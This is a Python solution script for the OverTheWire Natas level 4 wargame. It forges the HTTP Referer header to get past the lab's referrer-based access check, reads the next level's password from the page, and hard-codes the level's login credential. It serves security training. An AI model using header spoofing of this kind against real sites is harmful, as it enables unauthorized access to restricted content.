import requests
import re

"""
Explanation:
Every time you make a request to natas4, they would respond with:
"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""
This gave me the idea of exploiting the header of the request. So I implemented the "Referer" header which contains the address of the page making the request

Previously:
I thought I had to change the "Host" header into order to exploit this vulnerability, but then I found out that "Host" represents the host you are sending the request to which doesn't work.
"""

# Authentication
username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

# URL to users.txt
url = f"http://{username}.natas.labs.overthewire.org"
headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

response = requests.get(url, auth=(username, password), headers=headers)
content = response.text

print(re.findall("The password for natas5 is (.*)", content)[0])